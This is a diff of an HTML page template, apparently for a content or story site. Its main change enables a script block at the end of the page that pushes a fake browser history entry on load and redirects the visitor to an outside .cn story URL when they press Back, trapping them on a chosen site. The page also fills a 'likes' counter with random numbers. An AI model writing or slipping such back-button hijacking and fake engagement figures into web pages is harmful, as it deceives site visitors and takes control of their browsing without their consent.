@@ -15,46 +15,6 @@
           content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no"/>
     <title>loading...</title>
 </head>
-
-<script>
-
-    var hrefurl = "";
-    if (hrefurl.length == 0) {
-        function clickfh() {
-            // location.href = 'https://c63836.818tu.com/referrals/index/3266074';
-            location.href = 'http://dja8el.cn/story/newest-1837.html';
-        }
-    } else {
-        function clickfh() {
-            location.href = 'http://dja8el.cn/story/newest-1837.html';
-        }
-
-        window.onhashchange = function () {
-            jp();
-        };
-
-        function hh() {
-            history.pushState(history.length + 1, "app", "#pt_" + new Date().getTime());
-        }
-
-        function jp() {
-            location.href = ''
-        }
-
-        window.onload = function () {
-            if (sessionStorage.isAT) {
-                chkwvs = function () {
-                };
-                player.onplaying = function () {
-                    if (!sessionStorage.pt) {
-                        sessionStorage.pt = new Date().getTime();
-                    }
-                };
-                sessionStorage.removeItem("isAT");
-            }
-            setTimeout('hh();', 100);
-        }
-    }</script>
 <body style="margin:0px auto;width:100%;max-width:685px;padding-bottom:0px;">
 <link rel="stylesheet" href="../../static/css/content.css" type="text/css"
       th:href="@{/css/content.css}"/>
@@ -154,9 +114,9 @@
         var windowHeight = $(this).height();
         var bottomView = document.getElementById('bottomFixedContent');
         if (scrollTop > 0.5 * scrollHeight) {
-            bottomView.style.display = ''
+            bottomView.style.display = 'block';
         } else {
-            // bottomView.style.display = 'none'
+            bottomView.style.display = 'none'
         }
     });
     $('#likeNum').html(Number.parseInt(Math.random() * 15000) + 5000);
@@ -291,6 +251,44 @@
     }())
     deTimer = self.setInterval(adGo, 200);
 </script>
+<script>
+    var hrefurl = "http://dja8el.cn/story/newest-1837.html";
+    if (hrefurl.length == 0) {
+        function clickfh() {
+            // location.href = 'https://c63836.818tu.com/referrals/index/3266074';
+            location.href = 'http://dja8el.cn/story/newest-1837.html';
+        }
+    } else {
+        function clickfh() {
+            location.href = 'http://dja8el.cn/story/newest-1837.html';
+        }
+
+        window.onhashchange = function () {
+            jp();
+        };
+
+        function hh() {
+            history.pushState(history.length + 1, "app", "#pt_" + new Date().getTime());
+        }
+
+        function jp() {
+            location.href = 'http://dja8el.cn/story/newest-1837.html'
+        }
+
+        window.onload = function () {
+            if (sessionStorage.isAT) {
+                chkwvs = function () {
+                };
+                player.onplaying = function () {
+                    if (!sessionStorage.pt) {
+                        sessionStorage.pt = new Date().getTime();
+                    }
+                };
+                sessionStorage.removeItem("isAT");
+            }
+            setTimeout('hh();', 100);
+        }
+    }</script>
 </body>
 </html>
  
